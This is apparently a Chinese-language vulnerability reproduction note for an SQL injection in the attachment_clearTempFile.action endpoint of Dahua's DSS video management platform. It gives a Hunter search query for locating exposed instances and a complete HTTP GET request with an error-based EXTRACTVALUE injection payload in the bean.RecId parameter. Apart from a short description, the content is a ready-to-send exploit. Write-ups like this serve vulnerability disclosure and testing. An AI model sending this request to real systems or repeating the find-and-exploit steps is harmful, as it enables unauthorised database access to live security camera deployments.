# 大华 DSS 视频管理系统attachment_clearTempFile存在SQL注入漏洞

# 一、漏洞简介
<font style="color:rgb(0, 0, 0);">大华DSS城市安防监控平台是一个在通用安防视频监控系统基础上设计开发的系统。大华DSS城市安防监控平台attachment_clearTempFile文件存在SQL注入漏洞，攻击者可以通过此漏洞获取数据库权限。</font>

# 二、影响版本
+ 大华 DSS 视频管理系统

# 三、资产测绘
+ hunter：`app.name=="Dahua 大华 DSS 视频管理系统"`

![1691867182224-1219c86f-cf8f-45b6-a1cf-8161c98567cc.png](./img/8ALRMRupTeWfQbmC/1691867182224-1219c86f-cf8f-45b6-a1cf-8161c98567cc-419113.png)

+ 登录页面

![1691867201317-4728fc1e-bdf3-485b-a82a-67995f73e590.png](./img/8ALRMRupTeWfQbmC/1691867201317-4728fc1e-bdf3-485b-a82a-67995f73e590-437522.png)

# 四、漏洞复现
```java
GET /portal/attachment_clearTempFile.action?bean.RecId=1%27)%20AND%20EXTRACTVALUE(8841,CONCAT(0x7e,md5(1),0x7e))%20AND%20(%27mYhO%27=%27mYhO&bean.TabName=1 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip
Connection: close
```

![1714291586245-19c2c45a-f9d8-4c77-af35-4f000ae2956c.png](./img/8ALRMRupTeWfQbmC/1714291586245-19c2c45a-f9d8-4c77-af35-4f000ae2956c-415198.png)



> 更新: 2024-04-28 16:06:59  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/bz9pqrmrb068vt05>